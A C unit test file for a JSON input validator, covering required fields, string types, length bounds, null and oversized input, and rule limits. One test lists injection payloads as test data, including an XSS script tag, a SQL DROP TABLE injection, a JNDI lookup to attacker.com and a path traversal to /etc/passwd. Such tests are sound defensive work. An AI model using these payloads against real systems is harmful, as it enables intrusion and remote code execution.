/**
 * @file test_input_validator.c
 * @brief 输入验证器单元测试 (TeamC)
 * @copyright (c) 2026 SPHARX. All Rights Reserved.
 * 对齐: 新版 input_validator.h API (VALIDATE_STRING+min_len/max_len)
 */

#include "input_validator.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

static int test_count = 0;
static int pass_count = 0;

#define TEST_ASSERT(cond, msg) do { \
    test_count++; \
    if (cond) { pass_count++; } else { \
        printf("  FAIL: %s (line %d)\n", msg, __LINE__); \
    } \
} while(0)

static int test_validator_create_destroy(void) {
    printf("  test_validator_create_destroy...\n");

    validation_result_t* v = validator_create();
    TEST_ASSERT(v != NULL, "create non-null");
    TEST_ASSERT(v != NULL && v->valid == 1, "initial valid=1");

    validator_destroy(v);
    validator_destroy(NULL);

    printf("    PASSED\n");
    return 0;
}

static int test_validate_required(void) {
    printf("  test_validate_required...\n");

    validation_result_t* v = validator_create();
    cJSON* data = cJSON_CreateObject();
    cJSON_AddStringToObject(data, "name", "Test");

    validation_rule_t rule = { .type = VALIDATE_REQUIRED, .field_name = "name" };
    int ret = validator_add_rule(v, &rule);
    TEST_ASSERT(ret == 0, "add required rule");

    validation_result_t* result = validator_validate(v, data);
    TEST_ASSERT(result != NULL, "validate returns non-null");
    TEST_ASSERT(result->valid == 1, "valid data accepted");

    validator_destroy(result);

    cJSON_Delete(data);
    data = cJSON_CreateObject();

    v = validator_create();
    validator_add_rule(v, &rule);
    result = validator_validate(v, data);
    TEST_ASSERT(result != NULL, "missing field returns result");
    TEST_ASSERT(result->valid == 0, "missing field rejected");

    validator_destroy(result);
    cJSON_Delete(data);

    printf("    PASSED\n");
    return 0;
}

static int test_validate_string_type(void) {
    printf("  test_validate_string_type...\n");

    validation_result_t* v = validator_create();
    cJSON* data = cJSON_CreateObject();
    cJSON_AddStringToObject(data, "text", "Hello");

    validation_rule_t rule = { .type = VALIDATE_STRING, .field_name = "text" };
    validator_add_rule(v, &rule);

    validation_result_t* result = validator_validate(v, data);
    TEST_ASSERT(result != NULL && result->valid == 1, "string accepted");

    validator_destroy(result);

    v = validator_create();
    cJSON_Delete(data);
    data = cJSON_CreateObject();
    cJSON_AddNumberToObject(data, "text", 123);

    validator_add_rule(v, &rule);
    result = validator_validate(v, data);
    TEST_ASSERT(result != NULL && result->valid == 0, "non-string rejected");

    validator_destroy(result);
    cJSON_Delete(data);

    printf("    PASSED\n");
    return 0;
}

static int test_validate_length_limits(void) {
    printf("  test_validate_length_limits...\n");

    validation_result_t* v = validator_create();
    cJSON* data = cJSON_CreateObject();
    cJSON_AddStringToObject(data, "password", "abc123");

    validation_rule_t rule = {
        .type = VALIDATE_STRING,
        .field_name = "password",
        .min_len = 4,
        .max_len = 20
    };
    validator_add_rule(v, &rule);

    validation_result_t* result = validator_validate(v, data);
    TEST_ASSERT(result != NULL && result->valid == 1, "length 6 in [4,20] accepted");

    validator_destroy(result);

    v = validator_create();
    cJSON_Delete(data);
    data = cJSON_CreateObject();
    cJSON_AddStringToObject(data, "password", "ab");

    rule.min_len = 4;
    rule.max_len = 20;
    validator_add_rule(v, &rule);
    result = validator_validate(v, data);
    TEST_ASSERT(result != NULL && result->valid == 0, "length 2 < 4 rejected");

    validator_destroy(result);
    cJSON_Delete(data);

    printf("    PASSED\n");
    return 0;
}

static int test_convenience_functions(void) {
    printf("  test_convenience_functions...\n");

    cJSON* obj = cJSON_CreateObject();
    cJSON_AddStringToObject(obj, "name", "Test User");
    cJSON_AddNumberToObject(obj, "age", 25);

    char* error = NULL;

    int ret = validate_string_field(obj, "name", 2, 50, &error);
    TEST_ASSERT(ret == 0, "valid string accepted");
    free(error); error = NULL;

    ret = validate_string_field(obj, "nonexistent", 2, 50, &error);
    TEST_ASSERT(ret != 0, "missing string rejected");
    free(error); error = NULL;

    ret = validate_required_field(obj, "name", &error);
    TEST_ASSERT(ret == 0, "existing required field OK");
    free(error); error = NULL;

    ret = validate_required_field(obj, "missing", &error);
    TEST_ASSERT(ret != 0, "missing required field rejected");
    free(error); error = NULL;

    ret = validate_string_field(obj, "name", 10, 50, &error);
    TEST_ASSERT(ret != 0, "too short string rejected");
    free(error); error = NULL;

    cJSON_Delete(obj);

    printf("    PASSED\n");
    return 0;
}

static int test_multiple_rules(void) {
    printf("  test_multiple_rules...\n");

    validation_result_t* v = validator_create();

    cJSON* data = cJSON_CreateObject();
    cJSON_AddStringToObject(data, "username", "testuser");
    cJSON_AddStringToObject(data, "email", "test@example.com");
    cJSON_AddNumberToObject(data, "score", 85);

    validation_rule_t rules[] = {
        { .type = VALIDATE_REQUIRED, .field_name = "username" },
        { .type = VALIDATE_STRING, .field_name = "username", .min_len = 3, .max_len = 32 },
        { .type = VALIDATE_REQUIRED, .field_name = "email" },
        { .type = VALIDATE_STRING, .field_name = "email" },
        { .type = VALIDATE_INT, .field_name = "score" }
    };

    for (size_t i = 0; i < sizeof(rules)/sizeof(rules[0]); i++) {
        int ret = validator_add_rule(v, &rules[i]);
        TEST_ASSERT(ret == 0, "add multi-rule");
    }

    validation_result_t* result = validator_validate(v, data);
    TEST_ASSERT(result != NULL && result->valid == 1, "multi-field valid data accepted");

    if (result) {
        if (result->error_message) printf("  (error: %s)\n", result->error_message);
    }

    validator_destroy(result);
    cJSON_Delete(data);

    printf("    PASSED\n");
    return 0;
}

/* ========== Round 8: 边界测试扩展 (C-W1-003) ========== */

static int test_null_input_handling(void) {
    printf("  test_null_input_handling...\n");

    validation_result_t* v = validator_create();
    cJSON* data = NULL;

    validation_rule_t rule = { .type = VALIDATE_REQUIRED, .field_name = "test" };
    validator_add_rule(v, &rule);

    validation_result_t* result = validator_validate(v, data);
    TEST_ASSERT(result != NULL, "NULL data returns non-null result");
    TEST_ASSERT(result->valid == 0, "NULL data rejected (valid=0)");

    if (result) {
        validator_destroy(result);
        result = NULL;
        v = NULL;
    }

    cJSON* valid_data = cJSON_CreateObject();
    result = validator_validate(NULL, valid_data);
    TEST_ASSERT(result == NULL, "NULL validator returns NULL");
    cJSON_Delete(valid_data);

    TEST_ASSERT(validator_add_rule(NULL, &rule) != 0, "NULL validator add_rule fails");

    validation_result_t* v2 = validator_create();
    validator_destroy(v2);
    v2 = NULL;
    validator_destroy(v2);
    printf("    PASSED\n");
    return 0;
}

static int test_oversized_input(void) {
    printf("  test_oversized_input...\n");

    validation_result_t* v = validator_create();

    char long_str[8192];
    memset(long_str, 'A', sizeof(long_str) - 1);
    long_str[sizeof(long_str) - 1] = '\0';

    cJSON* data = cJSON_CreateObject();
    cJSON_AddStringToObject(data, "field", long_str);

    validation_rule_t rule = {
        .type = VALIDATE_STRING,
        .field_name = "field",
        .min_len = 1,
        .max_len = 256
    };
    validator_add_rule(v, &rule);

    validation_result_t* result = validator_validate(v, data);
    TEST_ASSERT(result != NULL && result->valid == 0, "8191-char string >256 rejected");

    if (result) {
        validator_destroy(result);
        v = NULL;
    }

    rule.max_len = 10000;
    v = validator_create();
    validator_add_rule(v, &rule);
    result = validator_validate(v, data);
    TEST_ASSERT(result != NULL && result->valid == 1, "8191-char string <10000 accepted");

    if (result) {
        validator_destroy(result);
        v = NULL;
    }
    cJSON_Delete(data);

    printf("    PASSED\n");
    return 0;
}

static int test_special_characters_injection(void) {
    printf("  test_special_characters_injection...\n");

    validation_result_t* v = validator_create();

    const char* injection_strings[] = {
        "<script>alert('xss')</script>",
        "' OR \"1\"=\"1\"; DROP TABLE users; --",
        "${jndi:ldap://attacker.com/a}",
        "..%2F..%2Fetc%2Fpasswd",
        "\x00\x01\x02\x03\x04",
        NULL
    };

    for (int i = 0; injection_strings[i] != NULL; i++) {
        cJSON* data = cJSON_CreateObject();
        cJSON_AddStringToObject(data, "input", injection_strings[i]);

        validation_rule_t rule = {
            .type = VALIDATE_STRING,
            .field_name = "input",
            .min_len = 1,
            .max_len = 256
        };
        validator_add_rule(v, &rule);

        validation_result_t* result = validator_validate(v, data);
        TEST_ASSERT(result != NULL, "injection string returns result");

        if (result) {
            if (i < 3) {
                TEST_ASSERT(result->valid == 1, "special chars accepted (no pattern rule)");
            }
            validator_destroy(result);
        }

        cJSON_Delete(data);
        v = validator_create();
    }

    validator_destroy(v);
    v = NULL;
    printf("    PASSED\n");
    return 0;
}

static int test_boundary_exact_match(void) {
    printf("  test_boundary_exact_match...\n");

    validation_result_t* v = validator_create();

    char exact_4[5] = "abcd";
    char exact_20[21] = "abcdefghijklmnopqrst";

    cJSON* data = cJSON_CreateObject();
    cJSON_AddStringToObject(data, "field", exact_4);

    validation_rule_t rule = {
        .type = VALIDATE_STRING,
        .field_name = "field",
        .min_len = 4,
        .max_len = 20
    };
    validator_add_rule(v, &rule);

    validation_result_t* result = validator_validate(v, data);
    TEST_ASSERT(result != NULL && result->valid == 1, "exact min_len=4 accepted");

    if (result) {
        validator_destroy(result);
        v = NULL;
    }
    cJSON_DeleteItemFromObject(data, "field");
    cJSON_AddStringToObject(data, "field", exact_20);

    v = validator_create();
    validator_add_rule(v, &rule);
    result = validator_validate(v, data);
    TEST_ASSERT(result != NULL && result->valid == 1, "exact max_len=20 accepted");

    if (result) {
        validator_destroy(result);
        v = NULL;
    }
    cJSON_DeleteItemFromObject(data, "field");
    cJSON_AddStringToObject(data, "field", "abc");  /* len=3 */

    v = validator_create();
    validator_add_rule(v, &rule);
    result = validator_validate(v, data);
    TEST_ASSERT(result != NULL && result->valid == 0, "len=3 < min=4 rejected");

    if (result) {
        validator_destroy(result);
        v = NULL;
    }
    cJSON_Delete(data);

    printf("    PASSED\n");
    return 0;
}

static int test_max_rules_overflow(void) {
    printf("  test_max_rules_overflow...\n");

    validation_result_t* v = validator_create();

    for (int i = 0; i < MAX_RULES; i++) {
        char field_name[32];
        snprintf(field_name, sizeof(field_name), "field_%d", i);

        validation_rule_t rule = {
            .type = VALIDATE_REQUIRED,
            .field_name = field_name
        };
        int ret = validator_add_rule(v, &rule);
        TEST_ASSERT(ret == 0, "add rule within limit");
    }

    validation_rule_t overflow_rule = { .type = VALIDATE_REQUIRED, .field_name = "overflow" };
    int ret = validator_add_rule(v, &overflow_rule);
    TEST_ASSERT(ret != 0, "add rule beyond MAX_RULES fails");

    cJSON* data = cJSON_CreateObject();
    for (int i = 0; i < MAX_RULES; i++) {
        char field_name[32], value[16];
        snprintf(field_name, sizeof(field_name), "field_%d", i);
        snprintf(value, sizeof(value), "val_%d", i);
        cJSON_AddStringToObject(data, field_name, value);
    }

    validation_result_t* result = validator_validate(v, data);
    TEST_ASSERT(result != NULL && result->valid == 1, "MAX_RULES fields all validated");

    if (result) {
        validator_destroy(result);
        v = NULL;
    }
    cJSON_Delete(data);

    printf("    PASSED\n");
    return 0;
}

int main(void) {
    printf("\n=========================================\n");
    printf("  Input Validator Unit Tests (TeamC)\n");
    printf("=========================================\n\n");

    test_validator_create_destroy();
    test_validate_required();
    test_validate_string_type();
    test_validate_length_limits();
    test_convenience_functions();
    test_multiple_rules();

    /* ========== Round 8: 边界测试扩展 (C-W1-003) ========== */
    test_null_input_handling();
    test_oversized_input();
    test_special_characters_injection();
    test_boundary_exact_match();
    test_max_rules_overflow();

    printf("\n-----------------------------------------\n");
    printf("  Results: %d/%d tests passed\n", pass_count, test_count);
    if (pass_count == test_count) {
        printf("  ✅ All tests PASSED\n");
        return 0;
    } else {
        printf("  ❌ %d test(s) FAILED\n", test_count - pass_count);
        return 1;
    }
}
